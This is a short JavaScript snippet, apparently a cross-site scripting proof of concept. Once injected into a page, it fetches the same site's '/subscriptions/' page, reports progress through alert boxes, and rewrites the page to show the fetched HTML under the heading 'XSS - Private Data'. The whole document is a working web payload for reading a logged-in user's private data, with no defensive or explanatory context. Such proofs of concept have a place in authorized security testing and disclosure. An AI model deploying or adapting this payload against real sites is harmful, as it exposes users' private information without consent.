alert('Step 1: Script loaded');

fetch('/subscriptions/')
  .then(r => {
    alert('Step 2: Fetch completed, status: ' + r.status);
    return r.text();
  })
  .then(html => {
    alert('Step 3: HTML length: ' + html.length);
    document.body.innerHTML = '<h1>XSS - Private Data:</h1><textarea style="width:100%;height:800px">' + html + '</textarea>';
  })
  .catch(err => {
    alert('Error: ' + err);
  });
